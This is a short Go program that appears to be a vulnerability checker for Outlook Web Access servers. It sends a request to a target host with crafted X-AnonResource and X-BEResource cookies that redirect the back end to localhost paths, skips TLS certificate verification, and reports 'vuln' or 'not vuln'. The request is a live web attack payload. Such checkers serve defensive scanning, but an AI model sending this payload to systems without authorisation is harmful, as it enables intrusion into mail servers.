package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func Verify(tar string) bool {
	targetUrl := fmt.Sprintf("https://%s/owa/auth/temp.js", tar)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, _ := http.NewRequest("GET", targetUrl, nil)
	req.Header.Add("Cookie", "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	fmt.Println("Received body:%s", string(body))
	if strings.Contains(string(body), "NegotiateSecurityContext") || strings.Contains(string(body), "La ressource que vous recherchez") {
		return true
	} else {
		return false
	}
}
func main() {
	target := os.Args[1]
	if Verify(target) == true {
		fmt.Println("vuln")
	} else {
		fmt.Println("not vuln")
	}
}
